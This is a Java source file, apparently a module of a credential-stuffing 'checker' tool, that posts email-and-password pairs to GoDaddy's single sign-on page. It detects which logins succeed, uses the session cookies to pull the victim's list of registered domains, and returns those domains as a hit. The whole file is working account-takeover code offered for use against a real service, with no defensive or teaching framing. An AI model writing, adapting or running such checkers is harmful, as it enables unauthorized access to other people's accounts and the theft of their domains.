package client.checkers;

import java.util.List;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.jsoup.Connection;
import org.jsoup.Jsoup;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import org.jsoup.Connection.Method;
import org.jsoup.Connection.Response;

import client.components.Mailpass;
import client.components.Result;

public class Godaddy {
	
	public static final String GODADDY_LOGIN_SITE = "https://sso.godaddy.com/v1/?isc=gofklvt01&path=offers%2Fdefault.aspx&app=sales&realm=idp&ci=";
	public static final String GODADDY_LOGIN_URL = "https://sso.godaddy.com/v1/?isc=gofklvt01&path=offers%2Fdefault.aspx&app=sales&realm=idp&ci=";
	public static final String GODADDY_LOGOUT_URL = "https://sso.godaddy.com/logout?realm=idp&app=mya&path=";
	public static final String GODADDY_REDIRECT = "https://mya.godaddy.com/?";
	public static final String GODADDY_DOMAIN = "https://mya.godaddy.com/products/jsonContent/GetDomainsContainer.aspx?ci=54037&isc=ISC&TargetDivID=product-fill&accid=1&_=";
	
	
	public static Result check(Mailpass mailpass) {
		String strMail = mailpass.mail.split("@")[0];
		
		String strPass = mailpass.pass;
		System.out.println(strMail + "|" + strPass);
		Connection con = Jsoup.connect(GODADDY_LOGIN_URL)
								.header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36")
								.data("app", "www")
								.data("layout", "layout.rebrand_layout.html")
								.data("name", strMail)
								.data("password", strPass)
								.data("realm", "idp")
								//.followRedirects(false)
								.method(Method.POST);
		
		try {
			Response resp = con.execute();
			String userPattern = "<span id=\"customer-number\">[0-9]+</span>";
			Pattern userPat = Pattern.compile(userPattern);
			Matcher userMat = userPat.matcher(resp.body());
			
			// tim thay userId
			if (userMat.find()) {
				System.out.println("Find a user login");
				
				// wait 5 seconds to check user dashboard
				Thread.sleep(5000);
				Connection dCon = Jsoup.connect(GODADDY_DOMAIN + Long.toString(new Date().getTime()))
										.header("X-Requested-With", "XMLHttpRequest")
										.header("Accept-Language", "vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2")
										.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3078.0 Safari/537.36")
										.ignoreContentType(true)
										.cookies(resp.cookies())
										.method(Method.GET);
				Response dResp = dCon.execute();
				//System.out.println(dResp.body());
				Gson gson = new GsonBuilder().create();
				DomainResp domain = gson.fromJson(dResp.body(), DomainResp.class);
				String pattern = ">[A-Za-z0-9-]+\\.{1}[A-Za-z]+<";
				Pattern pat = Pattern.compile(pattern);
				
				Matcher mat = pat.matcher(domain.Html);
				String data = "";
				while (mat.find()) {
					String term = mat.group(0).replace(">", "").replace("<", "");
					data += term + "|";
				}
				
				StringBuilder sb = new StringBuilder(data);
				sb.deleteCharAt(sb.length()-1);
				System.out.println(sb.toString());
				// wait 5 seconds to logout
				Thread.sleep(5000);
				Jsoup.connect(GODADDY_LOGOUT_URL).get();
				
				return new Result(1, sb.toString());
			}
			
			
			
			
			
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		return new Result(0, "");
		
	}
}

class DomainResp {
	public String Html;
	public String TargetDivID;
	public String Data;
}
